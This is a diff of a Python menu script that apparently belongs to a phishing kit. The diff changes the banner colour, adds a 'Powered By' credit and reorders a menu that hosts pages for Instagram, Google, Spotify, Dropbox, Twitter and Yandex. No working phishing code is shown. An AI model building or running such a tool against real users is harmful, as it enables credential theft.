@@ -29,7 +29,7 @@ p = "\033[95;1m"
 
 
 def banner():
-    print(f"""{pu}
+    print(f"""{w}
  $$$$$$\  $$$$$$$$\ $$\   $$\ 
 $$  __$$\ $$  _____|$$ | $$  |
 $$ /  \__|$$ |      $$ |$$  / 
@@ -39,7 +39,7 @@ $$ |  $$\ $$ |      $$ |\$$\
 \$$$$$$  |$$$$$$$$\ $$ | \$$\ 
  \______/ \________|\__|  \__|
                               
-                                """)
+                            {w}Powered By: Cyber security Batch """)
 
 
 banner()
@@ -95,9 +95,9 @@ def host_optn(server):
 
 
 def optn():
-    print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}05{y}] {c} Dropbox ")
-    print(f"{y}[{g}02{y}] {c} Spotify       {y}[{g}06{y}] {c} Twitter ")
-    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}07{y}] {c} Yandex ")
+    print(f"{y}[{g}01{y}] {c} Twitter       {y}[{g}04{y}] {c} Dropbox ")
+    print(f"{y}[{g}02{y}] {c} Spotify       {y}[{g}05{y}] {c} Instagram ")
+    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}06{y}] {c} Yandex ")
 
 
 optn()
@@ -109,15 +109,15 @@ except KeyboardInterrupt:
     time.sleep(1)
     sys.exit()
 # Make handle for user input----------------
-if optn == '1' or optn == '01':
+if optn == '5' or optn == '05':
     host_optn("instagram")
-elif optn == '2' or optn == '02':
-    host_optn("google")
 elif optn == '3' or optn == '03':
+    host_optn("google")
+elif optn == '2' or optn == '02':
     host_optn("spotify")
 elif optn == '4' or optn == '04':
     host_optn("dropbox")
-elif optn == '5' or optn == '05':
+elif optn == '1' or optn == '01':
     host_optn("twitter")
 elif optn == '6' or optn == '06':
     host_optn("yandex")
